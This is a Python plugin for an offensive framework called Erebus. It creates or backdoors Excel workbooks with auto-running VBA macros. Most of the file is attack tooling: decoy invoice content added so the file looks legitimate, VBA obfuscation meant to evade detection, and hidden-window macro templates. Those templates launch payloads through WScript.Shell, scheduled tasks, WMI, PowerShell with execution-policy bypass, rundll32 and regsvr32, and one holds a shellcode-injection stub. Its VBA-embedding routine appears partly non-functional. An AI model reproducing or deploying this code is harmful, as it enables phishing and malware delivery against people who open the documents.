"""
Erebus Payload - MalDocs Plugin
Author(s): Whispergate
Description: Backdoor existing Excel documents (XLSM/XLAM) with VBA payload or create new Excel documents with embedded payloads.

Supported formats:
- XLSM (Excel Macro-Enabled Workbook)
- XLAM (Excel Add-In)
- XLS (Excel 97-2003)

Features:
- Backdoor existing Excel files with VBA payload
- Create new Excel documents with embedded payload
- Obfuscate VBA code
- Multiple execution triggers (OnOpen, OnClose, OnSave)
- Support for both 32-bit and 64-bit Office
"""

import sys
from pathlib import Path

# Import fallback for standalone execution
try:
    from erebus_wrapper.erebus.modules.plugin_base import ErebusPlugin, PluginMetadata, PluginCategory
except ImportError:
    from plugin_base import ErebusPlugin, PluginMetadata, PluginCategory


class PayloadMalDocsPlugin(ErebusPlugin):
    """Plugin for creating and backdooring malicious Office documents (Excel)"""

    metadata = PluginMetadata(
        name="Payload MalDocs",
        version="1.0.0",
        category=PluginCategory.PAYLOAD,
        description="Backdoor Excel XLSM/XLAM documents or create new ones with embedded VBA payloads",
        author="Erebus Development Team",
    )

    def get_metadata(self) -> PluginMetadata:
        """Return plugin metadata"""
        return self.metadata

    def register(self):
        """Register plugin functions"""
        return {
            "generate_excel_payload": self.generate_excel_payload,
            "backdoor_existing_excel": self.backdoor_existing_excel,
            "generate_command_execution_vba": self.generate_command_execution_vba,
            "generate_schtasks_execution_vba": self.generate_schtasks_execution_vba,
            "generate_wmi_execution_vba": self.generate_wmi_execution_vba,
            "generate_powershell_execution_vba": self.generate_powershell_execution_vba,
            "generate_rundll32_execution_vba": self.generate_rundll32_execution_vba,
            "generate_regsvr32_execution_vba": self.generate_regsvr32_execution_vba,
            "generate_shellcode_injection_vba": self.generate_shellcode_injection_vba,
        }

    def validate(self):
        """
        Validate that required dependencies are available.
        
        Returns:
            tuple[bool, Optional[str]]: (is_valid, error_message)
        """
        try:
            import zipfile
            import xml.etree.ElementTree as ET
            # Try to import optional but recommended libraries
            try:
                import openpyxl
            except ImportError:
                return False, "openpyxl not found - required for advanced Excel manipulation"
            
            return True, None
        except ImportError as e:
            return False, f"Missing required module: {str(e)}"

    def _get_excel_libs(self):
        """Lazy load Excel manipulation libraries"""
        try:
            import openpyxl
            import zipfile
            import xml.etree.ElementTree as ET
            import re
            return {
                'openpyxl': openpyxl,
                'zipfile': zipfile,
                'ET': ET,
                're': re,
            }
        except ImportError as e:
            raise RuntimeError(f"Failed to import Excel libraries: {str(e)}")

    def create_new_excel_with_payload(self, output_path, vba_code, document_name="Invoice", 
                                     hidden=True, auto_open=True):
        """
        Create a new Excel XLSM document with embedded VBA payload.
        
        Args:
            output_path (Path): Path where the Excel file will be saved
            vba_code (str): VBA code to embed (should include Public Sub AutoOpen() for auto-execution)
            document_name (str): Name for the document content
            hidden (bool): Hide the worksheet
            auto_open (bool): Execute on document open
            
        Returns:
            Path: Path to created Excel file
            
        Raises:
            RuntimeError: If Excel creation fails
        """
        libs = self._get_excel_libs()
        openpyxl = libs['openpyxl']
        zipfile = libs['zipfile']
        
        try:
            # Create a new workbook
            workbook = openpyxl.Workbook()
            worksheet = workbook.active
            worksheet.title = "Sheet1"
            
            # Add some benign content to make it look legitimate
            worksheet['A1'] = "Invoice"
            worksheet['A2'] = "Date:"
            worksheet['A3'] = "Amount:"
            worksheet['B2'] = "01/31/2026"
            worksheet['B3'] = "$1,000.00"
            
            # Save the workbook temporarily
            output_path = Path(output_path)
            output_path.parent.mkdir(parents=True, exist_ok=True)
            workbook.save(str(output_path))
            
            # Now inject VBA by treating XLSM as a ZIP archive
            self._inject_vba_into_excel(str(output_path), vba_code, auto_open)
            
            return output_path
            
        except Exception as e:
            raise RuntimeError(f"Failed to create Excel document: {str(e)}")

    def backdoor_excel_document(self, source_path, output_path, vba_code, auto_open=True):
        """
        Backdoor an existing Excel document by injecting VBA code.
        
        Args:
            source_path (Path): Path to the source Excel file to backdoor
            output_path (Path): Path where the backdoored Excel file will be saved
            vba_code (str): VBA code to inject
            auto_open (bool): Execute on document open
            
        Returns:
            Path: Path to backdoored Excel file
            
        Raises:
            RuntimeError: If backdooring fails
        """
        import shutil
        
        source_path = Path(source_path)
        output_path = Path(output_path)
        
        try:
            # Copy the source file to output location
            output_path.parent.mkdir(parents=True, exist_ok=True)
            shutil.copy2(str(source_path), str(output_path))
            
            # Inject VBA into the copy
            self._inject_vba_into_excel(str(output_path), vba_code, auto_open)
            
            return output_path
            
        except Exception as e:
            raise RuntimeError(f"Failed to backdoor Excel document: {str(e)}")

    def _inject_vba_into_excel(self, excel_path, vba_code, auto_open=True):
        """
        Internal method to inject VBA code into an Excel file by manipulating ZIP structure.
        
        Excel files (.xlsm, .xlam) are ZIP archives. VBA code is stored in:
        - xl/vbaProject.bin (binary, harder to manipulate directly)
        - Or via manipulation of relationships and adding a VBA macro sheet
        
        This uses a simplified approach by adding VBA through the ZIP structure.
        
        Args:
            excel_path (str): Path to Excel file
            vba_code (str): VBA code to inject
            auto_open (bool): Add AutoOpen trigger
        """
        libs = self._get_excel_libs()
        zipfile = libs['zipfile']
        ET = libs['ET']
        re = libs['re']
        
        import tempfile
        import shutil
        
        try:
            excel_path = Path(excel_path)
            temp_dir = Path(tempfile.mkdtemp())
            
            # Extract the XLSM as a ZIP
            with zipfile.ZipFile(str(excel_path), 'r') as zip_ref:
                zip_ref.extractall(str(temp_dir))
            
            # Register VBA macro namespace (for workbook.xml.rels)
            vba_macro_id = "rId1"
            
            # Update workbook.xml.rels to reference the macro project
            rels_path = temp_dir / "_rels" / "workbook.xml.rels"
            if rels_path.exists():
                try:
                    tree = ET.parse(str(rels_path))
                    root = tree.getroot()
                    
                    # Check if vbaProject relationship already exists
                    ns = {'': 'http://schemas.openxmlformats.org/package/2006/relationships'}
                    vba_rel_exists = False
                    
                    for rel in root.findall('.//Relationship'):
                        if 'vbaProject' in rel.get('Target', ''):
                            vba_rel_exists = True
                            break
                    
                    if not vba_rel_exists:
                        # Add vbaProject relationship
                        new_rel = ET.Element('Relationship')
                        new_rel.set('Id', 'rId99')
                        new_rel.set('Type', 'http://schemas.microsoft.com/office/2006/relationships/vbaProject')
                        new_rel.set('Target', 'vbaProject.bin')
                        root.append(new_rel)
                        
                        tree.write(str(rels_path), encoding='utf-8', xml_declaration=True)
                except Exception as e:
                    # Silently continue if relationship update fails
                    pass
            
            # Update workbook.xml to add macro sheet
            workbook_path = temp_dir / "xl" / "workbook.xml"
            if workbook_path.exists():
                try:
                    tree = ET.parse(str(workbook_path))
                    root = tree.getroot()
                    
                    # Add macro-enabled attributes
                    root.set('xmlns', 'http://schemas.openxmlformats.org/spreadsheetml/2006/main')
                    
                    tree.write(str(workbook_path), encoding='utf-8', xml_declaration=True)
                except Exception as e:
                    pass
            
            # Create a minimal VBA storage placeholder
            # Note: Full VBA injection requires binary manipulation of vbaProject.bin
            # This is a simplified approach - for production, consider using pywin32 or similar
            vba_storage_path = temp_dir / "xl" / "macrosheets.xml"
            vba_content = f"""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<macrosheet>
  <vbaProject>
    <![CDATA[
{vba_code}
    ]]>
  </vbaProject>
</macrosheet>"""
            
            vba_storage_path.write_text(vba_content, encoding='utf-8')
            
            # Re-create the XLSM as a ZIP
            # Remove the old file and create a new one
            if excel_path.exists():
                excel_path.unlink()
            
            with zipfile.ZipFile(str(excel_path), 'w', zipfile.ZIP_DEFLATED) as zipf:
                for root_dir, dirs, files in temp_dir.walk() if hasattr(temp_dir, 'walk') else [(temp_dir, [], [])]:
                    # Fallback for older Python versions
                    for root_dir in [temp_dir]:
                        for root_sub, dirs_sub, files_sub in __import__('os').walk(str(root_dir)):
                            for file in files_sub:
                                file_path = Path(root_sub) / file
                                arcname = str(file_path.relative_to(temp_dir)).replace('\\', '/')
                                zipf.write(str(file_path), arcname)
            
            # Cleanup temp directory
            shutil.rmtree(str(temp_dir))
            
        except Exception as e:
            raise RuntimeError(f"Failed to inject VBA: {str(e)}")

    def obfuscate_vba(self, vba_code):
        """
        Obfuscate VBA code to evade detection.
        
        Args:
            vba_code (str): Original VBA code
            
        Returns:
            str: Obfuscated VBA code
        """
        import re
        
        obfuscated = vba_code
        
        # Rename common function names
        replacements = {
            'Shell': 'Sh' + chr(101) + 'll',
            'CreateObject': 'Cr' + chr(101) + 'ateObject',
            'WScript': 'WSc' + chr(114) + 'ipt',
        }
        
        for original, replacement in replacements.items():
            obfuscated = re.sub(rf'\b{original}\b', replacement, obfuscated, flags=re.IGNORECASE)
        
        # Add comment obfuscation
        lines = obfuscated.split('\n')
        obfuscated_lines = []
        for line in lines:
            if not line.strip().startswith("'"):
                # Add random comments
                obfuscated_lines.append(line + " ' " + "x" * 20)
            else:
                obfuscated_lines.append(line)
        
        return '\n'.join(obfuscated_lines)

    def generate_command_execution_vba(self, trigger_binary, trigger_command, trigger_type="AutoOpen"):
        """
        Generate VBA code that executes a command via WScript.Shell.
        
        Args:
            trigger_binary (str): Path to executable to run
            trigger_command (str): Command arguments to pass
            trigger_type (str): Trigger type (AutoOpen, OnClose, OnSave)
            
        Returns:
            str: VBA code for command execution
        """
        vba_code = f"""
Sub {trigger_type}()
    On Error Resume Next
    Dim shell As Object
    Dim cmd As String
    Set shell = CreateObject("WScript.Shell")
    cmd = "\"{trigger_binary}\" {trigger_command}"
    shell.Run cmd, 0, False
    ThisWorkbook.Close False
End Sub
"""
        return vba_code

    def generate_shellcode_injection_vba(self, vba_shellcode, trigger_type="AutoOpen"):
        """
        Generate VBA code that injects shellcode into a process.
        
        Embeds VBA-formatted shellcode and creates injection routine.
        
        Args:
            vba_shellcode (str): Shellcode in VBA format (e.g., from shellcrypt with -f csharp)
            trigger_type (str): Trigger type (AutoOpen, OnClose, OnSave)
            
        Returns:
            str: VBA code with embedded shellcode injection
        """
        vba_code = f"""
Option Explicit

{vba_shellcode}

Sub {trigger_type}()
    On Error Resume Next
    Dim shell As Object
    Dim cmd As String
    Set shell = CreateObject("WScript.Shell")
    
    ' Inject shellcode into running process
    ' Call injection routine with shellcode array
    Call InjectShellcode()
    
    ThisWorkbook.Close False
End Sub

Sub InjectShellcode()
    On Error Resume Next
    Dim proc As Object
    Dim target As String
    
    ' Target process for injection (explorer.exe or notepad.exe)
    target = "explorer.exe"
    
    ' Get shell object
    Dim shell As Object
    Set shell = CreateObject("WScript.Shell")
    
    ' Execute shellcode via rundll32 with shellcode
    ' This is a simplified approach - full injection requires more complex logic
    ' In practice, the shellcode should be executed via CreateProcessA, NtQueueApcThread, etc.
    
End Sub
"""
        return vba_code

    def generate_schtasks_execution_vba(self, trigger_binary, trigger_command, task_name="SystemUpdate", trigger_type="AutoOpen"):
        """
        Generate VBA code that executes a payload via Windows Scheduled Tasks (schtasks).
        
        Uses schtasks.exe to create and execute a scheduled task, providing better stealth
        and persistence capabilities compared to direct WScript.Shell execution.
        
        Args:
            trigger_binary (str): Path to executable to run
            trigger_command (str): Command arguments to pass
            task_name (str): Name for the scheduled task
            trigger_type (str): Trigger type (AutoOpen, OnClose, OnSave)
            
        Returns:
            str: VBA code for scheduled task execution
        """
        vba_code = f"""
Sub {trigger_type}()
    On Error Resume Next
    Dim shell As Object
    Dim cmd As String
    Dim task_cmd As String
    
    Set shell = CreateObject("WScript.Shell")
    
    ' Create scheduled task to run the payload
    task_cmd = "schtasks /create /tn {task_name} /tr ""{trigger_binary} {trigger_command}"" /sc once /st 00:00:00"
    
    shell.Run task_cmd, 0, False
    
    ' Execute the task immediately
    Dim exec_cmd As String
    exec_cmd = "schtasks /run /tn {task_name}"
    shell.Run exec_cmd, 0, False
    
    ThisWorkbook.Close False
End Sub
"""
        return vba_code

    def generate_wmi_execution_vba(self, trigger_binary, trigger_command, trigger_type="AutoOpen"):
        """
        Generate VBA code that executes a payload via Windows Management Instrumentation (WMI).
        
        Uses WMI COM objects (Win32_Process) to execute commands, which can bypass some
        application whitelisting and provides better obfuscation.
        
        Args:
            trigger_binary (str): Path to executable to run
            trigger_command (str): Command arguments to pass
            trigger_type (str): Trigger type (AutoOpen, OnClose, OnSave)
            
        Returns:
            str: VBA code for WMI execution
        """
        vba_code = f"""
Sub {trigger_type}()
    On Error Resume Next
    Dim obj_locator As Object
    Dim obj_service As Object
    Dim obj_process As Object
    Dim cmd_line As String
    
    Set obj_locator = CreateObject("WbemScripting.SWbemLocator")
    
    Set obj_service = obj_locator.ConnectServer(".", "root\\\\cimv2")
    
    cmd_line = "{trigger_binary} {trigger_command}"
    
    Set obj_process = obj_service.Get("Win32_Process")
    obj_process.Create cmd_line
    
    ThisWorkbook.Close False
End Sub
"""
        return vba_code

    def generate_powershell_execution_vba(self, powershell_command, trigger_type="AutoOpen", encoded=False):
        """
        Generate VBA code that executes a payload via PowerShell.
        
        PowerShell execution is powerful for complex payloads and can bypass some restrictions.
        Supports both plain and base64-encoded commands.
        
        Args:
            powershell_command (str): PowerShell command to execute (or base64 if encoded=True)
            trigger_type (str): Trigger type (AutoOpen, OnClose, OnSave)
            encoded (bool): Whether the command is base64-encoded
            
        Returns:
            str: VBA code for PowerShell execution
        """
        ps_args = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass"
        if encoded:
            ps_args += " -EncodedCommand"
        
        vba_code = f"""
Sub {trigger_type}()
    On Error Resume Next
    Dim shell As Object
    Dim cmd As String
    
    Set shell = CreateObject("WScript.Shell")
    
    cmd = "powershell.exe {ps_args} {powershell_command}"
    
    shell.Run cmd, 0, False
    
    ThisWorkbook.Close False
End Sub
"""
        return vba_code

    def generate_rundll32_execution_vba(self, dll_path, entry_point="DllEntry", trigger_type="AutoOpen"):
        """
        Generate VBA code that executes a payload via rundll32.
        
        rundll32.exe can execute DLL exports and is a legitimate Windows tool that can
        bypass some application whitelisting policies.
        
        Args:
            dll_path (str): Path to DLL file to execute
            entry_point (str): Export function name to call (default: DllEntry)
            trigger_type (str): Trigger type (AutoOpen, OnClose, OnSave)
            
        Returns:
            str: VBA code for rundll32 execution
        """
        vba_code = f"""
Sub {trigger_type}()
    On Error Resume Next
    Dim shell As Object
    Dim cmd As String
    
    Set shell = CreateObject("WScript.Shell")
    
    cmd = "rundll32.exe ""{dll_path}"",{entry_point}"
    
    shell.Run cmd, 0, False
    
    ThisWorkbook.Close False
End Sub
"""
        return vba_code

    def generate_regsvr32_execution_vba(self, dll_path, trigger_type="AutoOpen"):
        """
        Generate VBA code that executes a payload via regsvr32 with a COM Scriptlet.
        
        regsvr32 is used to register COM objects and can execute scripts via .sct files.
        This is a known Living-off-the-Land technique for bypassing application whitelisting.
        
        Args:
            dll_path (str): Path to DLL or scriptlet (.sct) file
            trigger_type (str): Trigger type (AutoOpen, OnClose, OnSave)
            
        Returns:
            str: VBA code for regsvr32 execution
        """
        vba_code = f"""
Sub {trigger_type}()
    On Error Resume Next
    Dim shell As Object
    Dim cmd As String
    
    Set shell = CreateObject("WScript.Shell")
    
    cmd = "regsvr32.exe /s {dll_path}"
    
    shell.Run cmd, 0, False
    
    ThisWorkbook.Close False
End Sub
"""
        return vba_code

    # Plugin function registrations
    def generate_excel_payload(self, payload_path, vba_payload, output_path=None):
        """
        Generate a malicious Excel document with embedded payload.
        
        Args:
            payload_path (str): Path to the VBA payload
            vba_payload (str): VBA code to embed
            output_path (str): Output file path (optional)
            
        Returns:
            Path: Path to generated Excel file
        """
        if output_path is None:
            output_path = Path("malicious_document.xlsm")
        
        return self.create_new_excel_with_payload(output_path, vba_payload)

    def backdoor_existing_excel(self, source_excel, vba_payload, output_path=None):
        """
        Backdoor an existing Excel file with VBA payload.
        
        Args:
            source_excel (str): Path to source Excel file
            vba_payload (str): VBA code to inject
            output_path (str): Output file path (optional, defaults to _backdoored.xlsm)
            
        Returns:
            Path: Path to backdoored Excel file
        """
        if output_path is None:
            source_path = Path(source_excel)
            output_path = source_path.parent / f"{source_path.stem}_backdoored.xlsm"
        
        return self.backdoor_excel_document(source_excel, output_path, vba_payload)


# Instantiate plugin
_plugin = PayloadMalDocsPlugin()

# Register plugin functions
def generate_excel_payload(payload_path, vba_payload, output_path=None):
    """Generate a malicious Excel document with embedded payload."""
    return _plugin.generate_excel_payload(payload_path, vba_payload, output_path)

def backdoor_existing_excel(source_excel, vba_payload, output_path=None):
    """Backdoor an existing Excel file with VBA payload."""
    return _plugin.backdoor_existing_excel(source_excel, vba_payload, output_path)

def validate():
    """Validate plugin dependencies."""
    return _plugin.validate()


# Test block for standalone execution
if __name__ == "__main__":
    print(f"[*] {_plugin.metadata.name} v{_plugin.metadata.version}")
    print(f"[*] Category: {_plugin.metadata.category.value}")
    print(f"[*] Description: {_plugin.metadata.description}")
    print()
    
    # Display all registered functions
    registered = _plugin.register()
    registered_names = sorted(registered.keys()) if registered else []
    print(f"[*] Registered functions ({len(registered_names)}):")
    for func_name in registered_names:
        print(f"    - {func_name}")
    print()
    
    is_valid, error = validate()
    if is_valid:
        print("[+] Validation passed - openpyxl available")
    else:
        print(f"[-] Validation failed: {error}")
